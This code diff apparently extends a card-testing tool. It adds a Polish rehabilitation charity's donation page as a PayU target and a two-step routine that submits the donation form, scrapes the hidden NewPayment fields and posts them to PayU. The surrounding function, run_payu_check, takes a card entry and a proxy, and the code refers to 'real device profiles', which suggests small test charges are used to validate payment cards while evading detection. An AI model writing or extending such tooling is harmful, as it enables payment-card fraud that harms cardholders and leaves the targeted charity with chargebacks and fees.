@@ -117,6 +117,30 @@ PAYU_SITES = {
             "flexible_donation[send_donation]": "Wy\u015blij darowizn\u0119",
         },
     },
+    "rehabilitacjaopole": {
+        "create_url": "https://rehabilitacjaopole.pl/darowizny/",
+        "create_type": "utf",
+        "referer": "https://rehabilitacjaopole.pl/darowizny/",
+        "origin": "https://rehabilitacjaopole.pl",
+        "amount": "10",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "en",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "donation_form": {
+            "radio": "amount_10",
+            "first_name": "{first}",
+            "last_name": "{last}",
+            "email": "{email}",
+            "desc": "Darowizna",
+            "phone": "",
+            "stan": "1",
+            "warunki": "on",
+            "donate": "WSPIERAM",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -266,7 +290,22 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
 
     try:
         # 1. create the order on the merchant (json API or html form + redirect)
-        if cfg["create_type"] == "form":
+        if cfg["create_type"] == "utf":
+            # two-step: donation form -> HTML with NewPayment form -> NewPayment -> redirect
+            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
+            r = await s.post(
+                cfg["create_url"], data=form,
+                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                         "Content-Type": "application/x-www-form-urlencoded"})
+            hidden = dict(re.findall(r'name="([^"]+)"\s+value="([^"]*)"', r.text))
+            if "pos_id" not in hidden:
+                raise Exception("utf create: NewPayment form not found")
+            r2 = await s.post(
+                PAYU_BASE + "/paygw/UTF/NewPayment", data=hidden, allow_redirects=False,
+                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                         "Content-Type": "application/x-www-form-urlencoded"})
+            redirect = r2.headers.get("Location") or ""
+        elif cfg["create_type"] == "form":
             form = {}
             for k, v in cfg["form_fields"].items():
                 form[k] = v.format(first=first, last=last, email=email)
